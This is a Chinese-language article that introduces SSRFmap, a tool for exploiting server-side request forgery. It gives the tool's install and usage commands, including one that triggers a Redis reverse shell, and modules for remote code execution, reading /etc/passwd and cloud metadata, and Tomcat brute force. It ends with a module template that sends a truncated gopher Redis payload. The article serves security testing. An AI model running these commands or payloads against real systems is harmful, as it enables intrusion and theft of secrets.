![aaaaa.png](https://image.3001.net/images/20190305/1551779060_5c7e44f445709.png!small)

SSRF，即[服务器端请求伪造](https://www.kitploit.com/search/label/Vulnerability)，很多网络犯罪分子都会利用SSRF来攻击或入侵网络服务。今天我们给大家介绍的这款工具名叫SSRFmap，它可以寻找并利用目标网络服务中的SSRF漏洞。

SSRFmap以Burp请求文件作为输入，研究人员可以利用参数选项来控制模糊测试的操作进程。

## 项目地址

SSRFmap：【[GitHub传送门](https://github.com/swisskyrepo/SSRFmap)】

## 工具安装

大家可以直接从GitHub代码库中克隆该项目至本地：

    
    
    git clone <https://github.com/swisskyrepo/SSRFmap>
    
    cd SSRFmap/
    
    python3 ssrfmap.py
    
     
    
    usage:ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [--lhost LHOST] [--lportLPORT] [--level LEVEL]
    
     
    
    optional arguments:
    
      -h, --help    show this help message and exit
    
      -r REQFILE    SSRF Request file
    
      -p PARAM      SSRF Parameter to target
    
      -m MODULES    SSRF Modules to enable
    
      -l HANDLER    Start an handler for a reverseshell
    
      --lhost LHOST LHOST reverse shell
    
      --lport LPORT LPORT reverse shell
    
      --level [LEVEL]  Level of test to perform (1-5, default: 1)
    
    ## 

## 工具使用

SSRFmap的默认使用方法如下：

    
    
    #Launch a portscan on localhost and read default files
    
    python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan
    
     
    
    #Triggering a reverse shell on a Redis
    
    python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242-l 4242
    
     
    
    # -lcreate a listener for reverse shell on the specified port
    
    #--lhost and --lport work like in Metasploit, these values are used to create areverse shell payload
    
    #--level : ability to tweak payloads in order to bypass some IDS/WAF. e.g:127.0.0.1 -> [::] -> 0000: -> ...

大姐可以使用data/example.py来测试框架是否能够正常运行：

    
    
    FLASK_APP=data/example.pyflask run &
    
    python ssrfmap.py -r data/request.txt -p url -m readfiles

## 功能模块

SSRFmap已整合了下列功能模块，大家可以使用-m参数来选择使用：

**模块名称** **** |  **模块描述** ****  
---|---  
fastcgi |  FastCGI RCE  
redis |  Redis RCE  
github |  Github企业版RCE < 2.8.7  
zabbix |  Zabbix RCE  
mysql |  MySQL命令执行  
docker |  Docker Infoleaks（API）  
smtp |  SMTP邮件发送  
Portscan |  主机端口扫描  
networkscan |  HTTP Ping sweep  
readfiles |  文件读取，例如/etc/passwd  
alibaba |  从供应商处读取文件 (例如: meta-data, user-data)  
aws |  从供应商处读取文件 (例如: meta-data, user-data)  
gce |  从供应商处读取文件 (例如: meta-data, user-data)  
digitalocean |  从供应商处读取文件 (例如: meta-data, user-data)  
socksproxy |  SOCKS4 代理  
smbhash |  通过UNC Path破解SMB认证  
tomcat |  爆破Tomcat Manager  
  
如果各位想针对特定服务添加自己的功能模块，可以参考下面这个模板代码：

    
    
    from core.utils import *
    
    import logging
    
     
    
    name          = "servicename inlowercase"
    
    description   = "ServiceName RCE - What does itdo"
    
    author        = "Name or pseudo of theauthor"
    
    documentation= ["<http://link_to_a_research>", "<http://another_link>"]
    
     
    
    class exploit():
    
        SERVER_HOST = "127.0.0.1"
    
        SERVER_PORT = "4242"
    
     
    
        def __init__(self, requester, args):
    
            logging.info("Module '{}' launched!".format(name))
    
     
    
            # Handle args for reverse shell
    
            if args.lhost == None: self.SERVER_HOST= input("Server Host:")
    
            else:                  self.SERVER_HOST = args.lhost
    
     
    
            if args.lport == None: self.SERVER_PORT= input("Server Port:")
    
            else:                  self.SERVER_PORT = args.lport
    
     
    
            # Data for the service
    
            # Using a generator to create the hostlist
    
            # Edit the following ip if you need totarget something else
    
            gen_host =gen_ip_list("127.0.0.1", args.level)
    
            for ip in gen_host:
    
                port = "6379"
    
                data ="*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
    
                payload = wrapper_gopher(data, ip ,port)
    
     
    
                # Handle args for reverse shell
    
                payload = payload.replace("SERVER_HOST",self.SERVER_HOST)
    
                payload =payload.replace("SERVER_PORT", self.SERVER_PORT)
    
     
    
                # Send the payload
    
                r =requester.do_request(args.param, payload)

***参考来源：[SSRFmap](https://github.com/swisskyrepo/SSRFmap)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

